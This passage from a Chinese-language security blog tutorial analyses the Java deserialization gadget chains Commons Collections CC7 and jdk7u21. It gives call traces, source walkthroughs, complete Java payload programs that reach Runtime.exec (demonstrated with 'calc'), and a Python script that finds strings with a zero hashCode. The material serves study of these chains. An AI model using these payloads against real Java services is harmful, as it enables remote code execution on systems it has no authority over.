class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关Transformer的payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TiedMapEntry</span></span><br><span class="line">        TiedMapEntry tm = <span class="keyword">new</span> TiedMapEntry(map,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造Hashtable</span></span><br><span class="line">        Hashtable ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        ht.put(tm,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在put完毕后再通过反射赋值以免本地执行</span></span><br><span class="line">        setFieldValue(tm,<span class="string">&quot;key&quot;</span>,Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151330230.png" alt="image-20220215133043038"></p>
<p>是成功了。</p>
<h3 id="CC7"><a href="#CC7" class="headerlink" title="- CC7 -"></a>- CC7 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="调用结构-6"><a href="#调用结构-6" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Hashtable.readObject()</span><br><span class="line">	👇</span><br><span class="line">	Hashtable.reconstitutionPut()</span><br><span class="line">	👇</span><br><span class="line">	AbstractMapDecorator.equals()</span><br><span class="line">		👇</span><br><span class="line">    	AbstractMap.equals()</span><br><span class="line">        	👇</span><br><span class="line">        	LazyMap.get()</span><br><span class="line">        	👇</span><br><span class="line">			ChainedTransformer.transform()</span><br><span class="line">			👇</span><br><span class="line">			ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    		👇</span><br><span class="line">    		InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    		👇</span><br><span class="line">    		InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    		👇</span><br><span class="line">            InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="分析-8"><a href="#分析-8" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>这个链仍然是改了前半段，先来看 <code>Hashtable</code> 类的 <code>readObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151405427.png" alt="image-20220215140542306"></p>
<p>这里是依次将序列化进去的内容取出，并将其作为 <code>key</code> 和 <code>value</code> 参数去调用 <code>reconstitutionPut</code> 方法，显然这些序列化的内容是由 <code>writeObject</code> 方法写入序列化中的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151407887.png" alt="image-20220215140730778"></p>
<p>而这些内容是来自 <code>Hashtable</code> 类的 <code>table</code> 属性，是可控的，且由于会在 <code>readObject</code> 方法中读取这些内容，那么 <code>table</code> 属性也是可以看作可序列化的，进而传入 <code>reconstitutionPut</code> 方法的 <code>key</code> 和 <code>value</code> 参数是可控可序列化的。</p>
<p>继续跟进 <code>reconstitutionPut</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151412510.png" alt="image-20220215141240414"></p>
<p>可见如果构造合适的值，让 <code>e.hash == hash</code> 成立时会执行到 <code>e.key.equals(key)</code> 这条语句，而变量 <code>e</code> 来自 <code>tab</code> 变量，也就是 <code>Hashtable</code> 类的 <code>table</code> 属性；同时在这个 <code>reconstitutionPut</code> 方法后面会有一个将传入的 <code>key</code> 和 <code>value</code> 参数存储至 <code>table</code> 属性的操作，这就意味着变量 <code>e</code> 的值是可以通过序列化数据控制的，也可以说是可控的。</p>
<p>此时也就可以得到形如 <code>[可控].equals()</code> 的结构，接着来看 <code>LazyMap</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151419224.png" alt="image-20220215141947170"></p>
<p>它是属于 <code>AbstractMapDecorator</code> 的子类，再跟进 <code>AbstractMapDecorator</code> 类，可以发现其拥有 <code>equals</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151421264.png" alt="image-20220215142133217"></p>
<p>如果传入 <code>equals</code> 的参数内容不为自身时，会接着调用 <code>equals</code> 方法，由于 <code>this.map</code> 属性为 <code>Map</code> 接口，且这个属性的值可以由 <code>AbstractMapDecorator</code> 类的构造方法赋值👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151425642.png" alt="image-20220215142534574"></p>
<p>显然 <code>LazyMap</code> 类的构造方法存在 <code>super()</code> 的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151427797.png" alt="image-20220215142700703"></p>
<p>因此 <code>this.map</code> 属性也就是可控的了，再来看 <code>AbstractMap</code> 类的 <code>equals</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151429663.png" alt="image-20220215142942549"></p>
<p>可以看到存在形如 <code>[(Map)可控].get()</code> 的结构，那么假如将上面的 <code>this.map</code> 属性构造成 <code>AbstractMap</code> 的子类，如空的 <code>HashMap</code> 类，然后构造好传入的参数 <code>o</code> 为 <code>LazyMap</code> 就可以到达 <code>LazyMap.get</code> 的形式了，后面就是有关 <code>Transformer</code> 调用的 <code>payload</code> 拼接了。</p>
<p>重新来看 <code>Hashtable</code> 类的 <code>reconstitutionPut</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151449087.png" alt="image-20220215144953002"></p>
<p>由于这里的 <code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code> 需要前一段，也就是 <code>e.hash</code> 必须成立，而变量 <code>e</code> 来自 <code>table</code> 属性，变量 <code>hash</code> 则来自读取的内容，就需要构造一个容量至少为 <code>2</code> 的 <code>Hashtable</code> ，以便第一个内容从 <code>reconstitutionPut</code> 方法注册进 <code>table</code> 属性后，第二个内容能和第一个内容(在 <code>table</code> 属性里的)作比较。</p>
<p>同时要满足第二个内容能和第一个内容作比较，就必须让变量 <code>index</code> 值相等，而变量 <code>index</code> 的值由 <code>hash</code> 变量计算得到，变量 <code>hash</code> 的值又由传入的 <code>key</code> 参数的 <code>hashCode</code> 方法得到，这就需要构造的容量为 <code>2</code> 的 <code>Hashtable</code> 键名值的 <code>hashCode</code> 方法得到的值必须是一样的。</p>
<p>另外由上面的分析可知，这个需要构造的容量为 <code>2</code> 的 <code>Hashtable</code> 的键名值必须为 <code>LazyMap</code> 类，这样才能在最后 <code>AbstractMap</code> 类中 <code>equals</code> 方法中由 <code>e.key.equals(key)</code> -&gt; <code>m = Key</code> -&gt; <code>m.get()</code> 。</p>
<p>此时这个需要构造的 <code>Hashtable</code> 内容大致如下👇</p>
<ul>
<li><code>Hashtable.put([LazyMap类(new HashMap(),Transformer的payload)],[任意值])</code></li>
<li><code>Hashtable.put([LazyMap类(new HashMap(),Transformer的payload)],[任意值])</code></li>
</ul>
<p>再来看如何让 <code>e.hash == hash</code> ，显然由于传入的 <code>key</code> 参数已经被规定为 <code>LazyMap</code> ，跟进 <code>LazyMap</code> 类的 <code>HashCode</code> 方法(在 <code>AbstractMapDecorator</code> 中)👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151505522.png" alt="image-20220215150553475"></p>
<p>可见是用了 <code>this.map</code> 属性的 <code>hashCode</code> 方法得到的结果，而 <code>this.map</code> 则被规定为了 <code>HashMap</code> ，来到 <code>AbstractMap</code> 类可以得到 <code>HashCode</code> 方法的具体实现👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151512126.png" alt="image-20220215151250071"></p>
<p>得到的是遍历整个 <code>HashMap</code> ，计算其每个元素通过 <code>hashCode</code> 方法得到的值之和，而这个元素实际上是 <code>HashMap</code> 类中的 <code>Node</code> 类，下面是其 <code>hashCode</code> 方法的实现👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151518629.png" alt="image-20220215151850541"></p>
<p>简单来说就是各调用键名值和对应值的 <code>hashCode</code> 方法，计算两者异或得到的结果作为 <code>hashCode</code> 方法的返回值。</p>
<p>那么如何让其通过 <code>hashCode</code> 方法得到的值相等呢，这方法可就多了，像什么玩字符溢出的，字符0值的，字符碰撞啥的都行。如果从简单的角度来说，由于在java中数值的 <code>hashCode</code> 方法得到的值一般是其本身的整型，众所周知任意数异或本身得数为0，像是 <code>1</code> 和 <code>1</code> 异或得到的值就为0，<code>2</code> 和 <code>2</code> 异或也为0，也就可以让存储在 <code>LazyMap</code> 中的 <code>HashMap</code> 内容设成两个相等的数值。</p>
<p>但由于 <code>Hashtable</code> 类的 <code>put</code> 方法中也存在 <code>equals</code> 方法的调用操作👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151603792.png" alt="image-20220215160327702"></p>
<p>在构造 <code>payload</code> 时如果进行 <code>put</code> 操作，就会间接通过 <code>LazyMap</code> 类的 <code>get</code> 方法中的 <code>super.map.put(key, value)</code> 将第一个 <code>LazyMap</code> 的 <code>HashMap</code> 键名以及调用 <code>payload</code> 得到的值放入第二个 <code>LazyMap</code> 的 <code>HashMap</code> 中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151614155.png" alt="image-20220215161447059"></p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151610357.png" alt="image-20220215161044296"></p>
<p>因此在构造 <code>payload</code> 时不仅需要先赋假值然后通过反射改值，还得 <code>remove</code> 掉第二个 <code>LazyMap</code> 中 <code>HashMap</code> 多出的键值对。</p>
<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="- payload -"></a>- payload -</h4><p>这条链的 <code>payload</code> 就有些复杂了👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer[] getTransformers(String cmd) &#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tfs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关假的有关Transformer的payload</span></span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="string">&quot;1&quot;</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造两个LazyMap</span></span><br><span class="line">        Map map1 = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line">        Map map2 = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其中 map1.hashCode = map2.hashCode = 0</span></span><br><span class="line">        map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        map2.put(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造Hashtable</span></span><br><span class="line">        Hashtable ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        ht.put(map1,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        ht.put(map2,<span class="string">&quot;321&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除多余键值对</span></span><br><span class="line">        map2.remove(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在put完毕后再通过反射赋值以免本地执行</span></span><br><span class="line">        setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,getTransformers(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151620590.png" alt="image-20220215162003391"></p>
<p>是成功了。</p>
<h2 id="jdk7u21"><a href="#jdk7u21" class="headerlink" title="- jdk7u21 -"></a>- jdk7u21 -</h2><p>实验环境：</p>
<ul>
<li><code>jdk1.6.0_45</code></li>
</ul>
<h3 id="调用结构-7"><a href="#调用结构-7" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HashSet.readObject()</span><br><span class="line">	👇</span><br><span class="line">	HashMap.put()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.equals()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">    👇</span><br><span class="line">    AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">    	👇</span><br><span class="line">		TemplatesImpl.newTransformer()</span><br><span class="line">        👇</span><br><span class="line">        TemplatesImpl.getTransletInstance()</span><br><span class="line">        👇</span><br><span class="line">        TemplatesImpl.defineTransletClasses()</span><br><span class="line">        👇</span><br><span class="line">        newInstance()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="- 分析 -"></a>- 分析 -</h3><p>这个链的和 <code>CC7</code> 链差不多，都需要往里面塞两个内容，然后通过 <code>反序列化</code> 注册进 <code>table</code> 属性后进行有关 <code>equals</code> 方法调用，不过用的是 <code>HashMap</code> 的 <code>put</code> 方法，在结构上会有些不同。 </p>
<p>先来看 <code>AnnotationInvocationHandler</code> 的 <code>equalsImpl</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171115155.png" alt="image-20220217111454977"></p>
<p>这里会调用自身的 <code>getMemberMethods</code> 方法获取 <code>某个类</code> 的所有方法，然后遍历这些方法依次进行调用，跟进 <code>getMemberMethods</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171117282.png" alt="image-20220217111707216"></p>
<p>可见是获取了 <code>this.type</code> 属性的所有方法，显然 <code>this.type</code> 属性是可控且可序列化的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171120804.png" alt="image-20220217112034758"></p>
<p>那么假设将 <code>this.type</code> 的值控制成 <code>TemplatesImpl</code> 类，也就可以遍历调用 <code>TemplatesImpl</code> 的所有方法，而在这些方法中就存在着 <code>newTransformer</code> 方法，进而达成 <code>TemplatesImpl</code> 的 <code>payload</code> 。</p>
<p>因此现在的关注点来到了 <code>AnnotationInvocationHandler</code> 代理调用的具体实现，先来看 <code>HashSet</code> 的 <code>readObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171125256.png" alt="image-20220217112545163"></p>
<p>会先遍历将写入读取序列化的内容进行 <code>反序列化</code> 并将结果作为参数调用 <code>map</code> 属性的 <code>put</code> 方法，这些写入的内容来自其 <code>writeObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171127908.png" alt="image-20220217112731818"></p>
<p>也就是可以将这些在 <code>readObject</code> 方法中读取的序列化内容当作是控且可序列化的，继续跟进 <code>map</code> 属性的 <code>put</code> 方法，由于 <code>map</code> 属性类型为 <code>HashMap</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171130811.png" alt="image-20220217113008760"></p>
<p>那么直接来看 <code>HashMap</code> 类的 <code>put</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171131754.png" alt="image-20220217113157674"></p>
<p>这和 <code>CC7</code> 链中的 <code>put</code> 方法部分的操作实际上是差不多的，唯一的区别是这里是以第一个内容的键名的值作为参数去调用第二个内容的 <code>equals</code> 方法。</p>
<p>因此必须保证 <code>HashMap</code> 中两个内容的 <code>hashCode</code> 是一致的，至于这两个内容的构成结构为如下👇</p>
<ul>
<li><code>HashSet.put([TemplatesImpl类()])</code></li>
<li><code>HashSet.put([AnnotationInvocationHand类()])</code></li>
</ul>
<p>其中第一个内容的 <code>TemplatesImpl</code> 类即是 <code>TemplatesImpl</code> 的 <code>payload</code> 内容，第二个内容的 <code>AnnotationInvocationHand</code> 类作为代理使用。至于第一个内容必须先为 <code>TemplatesImpl</code> 类的原因是在最后 <code>AnnotationInvocationHand</code> 类的  <code>equalsImpl</code> 方法中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171140820.png" alt="image-20220217114011691"></p>
<p>这个 <code>invoke</code> 方法所使用的类来自 <code>equals</code> 方法传入的参数，显然是必须为 <code>TemplatesImpl</code> 类的。</p>
<p>然后是保证第二个内容能达成 <code>e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))</code> 的语句，其中变量 <code>e</code>  来自 <code>table</code> 属性中索引为变量 <code>i</code> 的值，而变量 <code>i</code> 的值由变量 <code>hash</code> 的值决定，变量 <code>hash</code> 的值又来自键名的值的 <code>hashCode</code> 方法的返回值，要满足上边的条件也就得保证两个内容的键名的值调用 <code>hashCode</code> 方法的返回值一致，也就是等价于得让 <code>TemplatesImpl.hashCode() == AnnotationInvocationHand.hashCode()</code> 成立。</p>
<p>其中 <code>TemplatesImpl.hashCode()</code> 的值无法控制，而 <code>AnnotationInvocationHand.hashCode()</code> 在调用时由于 <code>AnnotationInvocationHand</code> 被作为代理使用，会先来到其 <code>invoke</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171154094.png" alt="image-20220217115405948"></p>
<p>进而调用其 <code>hashCodeImpl</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171156771.png" alt="image-20220217115620665"></p>
<p>可见在调用 <code>hashCode</code> 的最终返回值由 <code>this.memberValues</code> 属性的元素决定，而 <code>this.memberValues</code> 属性是可控且可序列化的。</p>
<p>继续看主要的部分 <code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code> ，其中 <code>var3</code> 变量为 <code>this.memberValues</code> 属性的值，这里会将 <code>this.memberValues</code> 属性各个元素中键名的值和对应的值调用 <code>hashCode</code> 方法得到的返回值进行异或的结果依次加上，最后返回得到的结果。而众所周知任意值对 <code>0</code> 的异或都为其本身，若这个 <code>this.memberValues</code> 属性的元素仅有一个且唯一一个元素的键名的值调用 <code>hashCode</code> 方法得到的结果为 <code>0</code> ，只要再让这个唯一一个元素的值的内容为 <code>TemplatesImpl</code> 类就可以让 <code>TemplatesImpl.hashCode() == AnnotationInvocationHand.hashCode()</code> 成立了。</p>
<p>那么如何找到一个 <code>hashCode</code> 方法结果为 <code>0</code> 的值呢，最简单的当然是用数值型，不过由于 <code>((String)var3.getKey()).hashCode()</code> 这一段让这个键名的值必须为字符串型，因此跟进 <code>String</code> 类的 <code>hashCode</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171207626.png" alt="image-20220217120738522"></p>
<p>可见其 <code>hashCode</code> 方法的最终返回值是遍历字符串中所有字符与其 <code>hash</code> 属性计算叠加的结果，而 <code>hash</code> 属性默认值是为 <code>0</code> 的且为 <code>int</code> 类型，此时就有两种方式能让返回值为 <code>0</code> 👇</p>
<ul>
<li><code>int</code> 类型溢出</li>
<li><code>0</code> 字节字符</li>
</ul>
<p>其中 <code>int</code> 类型溢出是流传的比较常用的方法，主要原理是因为 <code>int</code> 类型为 <code>8</code> 个字节长度，只要使最后计算的 <code>hash</code> 属性叠加的结果刚好为 <code>0x100000000</code> 就可以返回 <code>0</code> 了，因为当 <code>hash</code> 属性计算的叠加值大于 <code>0xffffffff</code> 时就有可能出现负数。</p>
<p>比如经典字符串<code>f5a5a608</code> 就是用的这个方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171217447.png" alt="image-20220217121701326"></p>
<p>可见是出现了负数，如果接着计算则相当于 <code>(((((-1322903560 * 31) &amp; 0xffffffff + 48) &amp; 0xffffffff) * 31) &amp; 0xffffffff + 56) &amp; 0xffffffff</code> ，其中 <code>((((-1322903560 * 31) &amp; 0xffffffff + 48) &amp; 0xffffffff) * 31) &amp; 0xffffffff</code> 值为 <code>0xffffffC8</code> ，也就是 <code>-56</code>。</p>
<p>还可以写一个简单的脚本来找这些字符👇</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">s = [each <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"><span class="comment"># 字符串长度&gt;=5才有可能溢出</span></span><br><span class="line">p = product(s,repeat=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> p:</span><br><span class="line">        h = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> c:</span><br><span class="line">            h = (<span class="number">31</span> * h + t) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        h = (<span class="number">31</span> * h) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> h &gt; <span class="number">0xffffff00</span>:</span><br><span class="line">            <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后再计算溢出差值即可，比如 <code>(142, 242, 198, 241, 171)</code> 差值为 <code>252</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171237107.png" alt="image-20220217123745040"></p>
